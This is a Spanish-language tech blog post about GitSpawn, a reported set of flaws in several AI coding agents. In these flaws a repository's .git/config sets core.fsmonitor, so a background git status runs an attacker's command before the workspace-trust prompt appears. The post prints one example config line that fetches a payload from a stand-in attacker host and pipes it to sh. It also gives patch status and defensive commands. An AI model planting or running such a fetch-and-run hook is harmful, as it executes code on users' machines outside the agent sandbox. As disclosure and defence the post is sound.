---
title: "GitSpawn: 8 vulnerabilidades RCE en 7 agentes de código IA — abrir un repo ajeno ya es suficiente para que te ejecuten comandos"
author: Carlos
pubDatetime: 2026-09-06T21:00:00Z
slug: gitspawn-rce-agentes-codigo-ia
featured: false
draft: false
tags:
  - Seguridad
  - IA
  - DevOps
description: "Manifold Security reveló GitSpawn, una familia de 8 fallas en 7 agentes de coding (Claude Code, Codex, Cursor, Goose, Hermes, Qwen Code y Grok Build) que permite ejecutar código solo con abrir un repositorio malicioso."
---

![Ilustración editorial de una terminal con un agente de código IA abriendo un repositorio, del que brota una cadena de comandos maliciosos en rojo, estilo tech editorial](../../assets/images/2026-09-06-gitspawn-rce-agentes-codigo-ia.jpg)

Se llama **GitSpawn** y no es un bug de Git: es una familia de **ocho vulnerabilidades en siete agentes de código con IA** que permite que un repositorio malicioso ejecute código en tu máquina **en el momento en que lo abres**. Sin prompt, sin click de aprobación y, en algunos agentes, antes incluso de que termine de cargar el workspace.

La divulgó **Manifold Security**, y la lista de afectados es casi todo el ecosistema: **Claude Code, OpenAI Codex, Cursor, Goose, Hermes, Qwen Code y Grok Build**.

## El mecanismo: Git haciendo exactamente lo que le pediste

El ataque se apoya en `core.fsmonitor`, una opción legítima de Git para mejorar rendimiento. Su valor es un comando de shell que Git ejecuta automáticamente cada vez que refresca el índice (es decir, en cada `git status` y `git diff`). El detalle clave: **Git lee esa configuración desde el `.git/config` del propio repositorio**.

Los agentes de coding corren `git status` y `git diff` en segundo plano al arrancar para armar contexto. El problema es que lo hacen sobre repositorios no confiables **sin sanitizar la configuración que el propio repo controla**. Resultado: Git ejecuta el comando del atacante con tus privilegios, fuera del sandbox del agente.

```ini
[core]
  fsmonitor = curl -s https://attacker.example/payload | sh
```

La defensa de una línea: `git config --global core.fsmonitor false`. Y antes de abrir cualquier repo recibido: `grep -i fsmonitor /path/to/repo/.git/config`.

## Quién parcheó y quién no (retesteado el 1 de septiembre)

- **Claude Code 2.1.196+** — parcheado (ojo: una segunda ruta de código en versiones anteriores sigue activa)
- **OpenAI Codex CLI 0.152.1+** — parcheado (CVE-2026-19592)
- **Cursor (última versión)** — parcheado
- **Goose 1.44.0+** — parcheado (CVE-2026-72718, severidad 7.0)
- **Hermes Agent** — sin parche; el payload se dispara antes del prompt de confianza del workspace
- **Qwen Code** — sin parche; se dispara antes de que el usuario se autentique
- **Grok Build** — sin parche; se dispara con la primera tecla

Lo más incómodo: en Claude Code y Hermes el payload corre **antes** de que aceptes el diálogo de "workspace trust". O sea, la pantalla de seguridad que crees que te protege es irrelevante.

## Por qué clonar es seguro y los archivos no

Un `git clone` normal **no** dispara esto: el clon crea un `.git/` fresco desde el remoto, así que el atacante no puede plantar un `.git/config` malicioso por esa vía. El ataque exige que el repo llegue **con su `.git/` intacto**: un ZIP, un release descargado de GitHub, un drive compartido, una carpeta de sync o un pendrive.

Y no es teoría. La campaña **FakeGit** —unas 7.600 repositorios maliciosos construidos por 6.600 perfiles falsos de desarrollador— viene distribuyendo justamente este tipo de archivos envenenados, con READMEs convincentes que guían al usuario (y a su agente) por un setup de rutina que activa un malware encadenado llamado SmartLoader.

## Qué hacer ahora mismo

1. Actualiza tus agentes: Claude Code 2.1.196+, Codex CLI 0.152.1+, Cursor y Goose 1.44.0+.
2. Desactiva fsmonitor global: `git config --global core.fsmonitor false`.
3. Nunca abras con un agente un repo recibido como ZIP o release; re-clónalo desde su fuente verificada.
4. Inspecciona antes de abrir: `grep -i fsmonitor /path/to/repo/.git/config`.
5. Evita Hermes, Qwen Code y Grok Build para repos no confiables hasta que publiquen parche.

El problema de fondo: los agentes presentan una fachada de "sandbox con aprobaciones", pero **cada subproceso que lanzan hereda los privilegios completos del usuario y el modelo de confianza completo de Git**. VS Code parcheó exactamente esta clase de bug en 2021; varios desarrolladores de agentes, al parecer, no revisaron el estado del arte.

**Fuentes:** Manifold Security, byteiota, The Hacker News, dev.to.
